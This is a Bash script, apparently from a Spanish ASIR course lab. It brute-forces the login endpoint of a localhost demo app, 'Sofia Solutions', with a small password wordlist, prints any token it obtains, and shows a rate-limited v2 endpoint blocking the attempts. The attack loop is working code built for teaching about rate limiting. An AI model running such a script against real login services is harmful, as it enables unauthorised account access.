#!/bin/bash
# ============================================================
#  SOFIA SOLUTIONS — Ataque de Fuerza Bruta (Académico ASIR)
#  Objetivo: Demostrar brute-force contra el endpoint V1
#  El modo seguro (V2) bloqueará después de 5 intentos.
# ============================================================

URL_VULN="http://localhost:8001/api/v1/auth/login"
URL_SAFE="http://localhost:8001/api/v2/auth/login"
TARGET_EMAIL="${1:-admin@sofia.local}"
WORDLIST=("password123" "admin" "1234" "SofiaAdmin" "qwerty" "letmein" "S0f1a_Secur3!_2026")

echo "============================================="
echo "  SOFIA SOLUTIONS — Brute Force Demo (ASIR)"
echo "============================================="
echo "[*] Target: $TARGET_EMAIL"
echo "[*] Probando ${#WORDLIST[@]} contraseñas..."
echo ""

MODE="${2:-vulnerable}"

if [ "$MODE" = "secure" ]; then
    echo "[!] MODO SEGURO — El Rate Limiter bloqueará tras 5 intentos fallidos"
    echo ""
    for PWD in "${WORDLIST[@]}"; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL_SAFE" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$PWD\"}")
        
        if [ "$RESPONSE" = "429" ]; then
            echo "[BLOQUEADO] Rate Limit activado — HTTP 429 Too Many Requests"
            echo "[✓] El servidor seguro rechazó el ataque correctamente."
            break
        elif [ "$RESPONSE" = "200" ]; then
            echo "[!!!] Acceso concedido con contraseña: $PWD"
        else
            echo "[ ] Fallo [$RESPONSE]: $PWD"
        fi
        sleep 0.3
    done
else
    echo "[!] MODO VULNERABLE — Sin Rate Limiting, todas las peticiones pasan"
    echo ""
    SUCCESS=false
    for PWD in "${WORDLIST[@]}"; do
        BODY=$(curl -s -X POST "$URL_VULN" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$PWD\"}")
        STATUS=$(echo "$BODY" | grep -o '"accessToken"' | wc -l | tr -d ' ')
        
        if [ "$STATUS" -gt 0 ]; then
            TOKEN=$(echo "$BODY" | grep -oP '"accessToken":"\K[^"]+' || echo "N/A")
            echo "[+++] ÉXITO — Contraseña encontrada: $PWD"
            echo "[+++] Token: ${TOKEN:0:40}..."
            SUCCESS=true
            break
        else
            echo "[ ] Fallo: $PWD"
        fi
        sleep 0.1
    done
    if [ "$SUCCESS" = false ]; then
        echo ""
        echo "[-] Ninguna de las contraseñas del diccionario coincide."
    fi
fi

echo ""
echo "============================================="
echo "  FIN DEL ATAQUE DE FUERZA BRUTA"
echo "============================================="
